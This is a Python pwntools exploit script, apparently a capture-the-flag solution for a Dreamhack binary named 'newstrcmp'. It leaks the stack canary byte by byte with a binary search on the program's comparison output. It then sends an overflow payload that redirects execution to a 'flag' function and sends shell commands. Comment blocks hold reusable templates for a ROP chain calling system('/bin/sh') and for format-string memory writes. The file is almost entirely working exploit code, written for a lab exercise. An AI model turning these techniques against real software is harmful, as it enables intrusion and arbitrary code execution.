#!/usr/bin/env python3
from pwn import *
import sys
import os
import socks
import socket
# Cre: Broder

"""
ROP

- ELF : elf
ropELF = ROP(elf)
ret = p(rop.find_gadget(['ret'])[0])

- libc : libc
rop = ROP(libc)
pop_rdi = p(rop.find_gadget(['pop rdi', 'ret'])[0])
ret = p(rop.find_gadget(['ret'])[0])
binsh = p(next(libc.search(b'/bin/sh\x00')))
system = p(libc.sym["system"])

rop_chain = [
    pop_rdi,
    binsh,
    ret,
    system
]
"""

"""
fmtstr

#value change to:
value = 0x7fffffffe6c0  # exmaple value

lower_16 = value & 0xffff 
middle_16 = (65536 - lower_16) + ((value >> 16) & 0xffff) 
high_16 = (65536 - ((value >> 16) & 0xffff)) + ((value >> 32) & 0xffff)
f"%{lower_16}c%15$hn%{middle_16}c%16$hn%{high_16}c%17$hn".encode().ljust(40,b'\x00') + rop_chain + p64(ret_to_main_ptr) + p64(ret_to_main_ptr+2) + p64(ret_to_main_ptr+4)
mega pop: pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
"""

context.log_level = 'info'
context.binary = elf = ELF('./newstrcmp', checksec=False)
_arch = 64
#libc = ELF('', checksec=False)
libc = elf.libc

environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'), 
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

# b *main+312
# b *newstrcmp+97
# b *main+287
gs = f"""
set solib-search-path {os.getcwd()}
b *main

b *newstrcmp+116
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
        # return gdb.debug(elf.path, env=environ, gdbscript=gs)
    elif args.REMOTE:
        return remote('host1.dreamhack.games', 17674)
    else:
        return process(elf.path)
        # return process(elf.path, env=environ)

def cmp(str1, str2):
    sla('Exit? (y/n): ', b'n')
    sla(b'Input string s1: ', str1)
    sla(b'Input string s2: ', str2)
    rcu(b'Result of newstrcmp: ')
    return io.recvline()

brutce = b''
pad = b'a' * 24
canary = 0
index_diff = 25

def binary_search(index):
    global brutce  
    global canary
    global index_diff
    l = 0
    r = 0xff
    
    while l <= r:
        mid = (l + r) // 2
        #info(f"l = {l}, r = {r}, mid = {mid}")
        str1 = pad + b'\n' + brutce + mid.to_bytes(1, 'big')
        str2 = pad
        
        result = cmp(str1, str2)
        #info(result)
        
        if str(index_diff).encode() not in result:
            break
        
        if b'larger' in result:
            r = mid - 1
        elif b'smaller' in result:
            l = mid + 1
    
        
    success(f"Found byte: {hex(mid)}")
    index_diff += 1
    brutce += mid.to_bytes(1, 'big')
    canary = canary + ((mid) << 8 * index)
    success(f"Canary: {hex(canary)}")
            
flag = p(elf.sym['flag'])
io = start()
for i in range(7):
    binary_search(i + 1)

paydload = b'a' * 0x18 + p64(canary) + b'a' * 8 + flag
cmp(b'a', paydload)
sla('Exit? (y/n): ', b'y')
sl(b'whoami')
sl(b'id')
io.interactive()

# if args.GDB:
#     pause()